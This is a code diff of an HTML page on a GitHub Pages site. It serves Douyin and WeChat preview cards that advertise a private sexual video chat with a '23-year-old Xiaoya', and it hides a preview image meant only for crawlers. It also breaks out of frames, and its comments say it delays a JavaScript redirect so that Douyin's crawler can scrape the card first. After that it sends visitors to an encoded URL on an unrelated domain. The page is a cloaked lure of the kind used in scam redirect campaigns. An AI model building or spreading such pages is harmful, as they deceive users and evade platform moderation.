@@ -2,39 +2,39 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0;url=http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- 预览标签 -->
+    <!-- 抖音分享标题 -->
     <title>23岁小雅在线等你💕 一对一私密视频聊天</title>
-    <meta name="description" content="只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人">
     
-    <!-- 社交媒体预览 -->
+    <!-- 抖音预览卡片标签 -->
     <meta property="og:title" content="23岁小雅在线等你💕 一对一私密视频聊天">
     <meta property="og:description" content="只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人">
-    <meta property="og:image" content="https://douyin1688.github.io/preview.png">
+    <meta property="og:image" content="https://douyin1688.github.io/333.png">
     <meta property="og:url" content="https://douyin1688.github.io">
-    <meta property="og:type" content="website">
     
-    <!-- 微信/QQ分享 -->
-    <meta itemprop="name" content="23岁小雅在线等你💕 一对一私密视频聊天">
-    <meta itemprop="description" content="只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人">
-    <meta itemprop="image" content="https://douyin1688.github.io/preview.png">
-    
-    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💋</text></svg>">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+        }
+    </style>
 </head>
 <body>
-    <!-- 预览图（隐藏但用于社交分享） -->
-    <img src="./333.png" alt="小雅私密聊天预览" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
+    <!-- 隐藏的预览图，仅用于抖音抓取 -->
+    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
     
-    <!-- 备用JavaScript跳转 -->
     <script>
-        // 如果meta refresh不工作，使用JavaScript跳转
+        // 防止页面被嵌入iframe
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+        
+        // 延迟跳转，给抖音爬虫时间抓取
         setTimeout(function() {
-            if (window.location.href.indexOf('douyin1688.github.io') !== -1) {
-                window.location.replace('http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D');
-            }
-        }, 100);
+            window.location.href = "http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D";
+        }, 2000);
     </script>
 </body>
 </html>
